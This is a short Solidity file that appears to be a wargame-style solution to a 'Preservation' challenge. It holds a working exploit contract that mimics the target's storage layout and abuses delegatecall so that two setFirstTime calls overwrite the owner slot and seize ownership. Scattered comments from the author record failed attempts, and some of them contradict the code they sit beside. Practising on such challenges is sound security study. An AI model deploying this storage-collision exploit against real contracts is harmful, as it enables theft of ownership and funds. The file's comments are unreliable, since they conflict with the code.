// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {

    //memic the same variables order
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    constructor() {

    }

    function attack(Preservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
        //this code didnt work
        //while 
        //await contract.setFirstTime("0x628D74561f0A2DEa923bEAd4E2bFbF5C1390e596") finally worked
    }
  
    //first call Preservation.setFirstTime(uint _timeStamp) given this contract address as an input.
    //address(this) = 0xaCA79665BFB7C7C12796C8634b2c1c367011fD7d
    //then call it again with your adress //passing your address tothe delegate didn't work, use msg.sender
    function setTime(uint256 time) external {
        //please note that owner = address(uint160(time)) didn't work 
        //owner = msg.sender;
        owner = address(uint160(time));
    }
}

contract Preservation {

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {}

}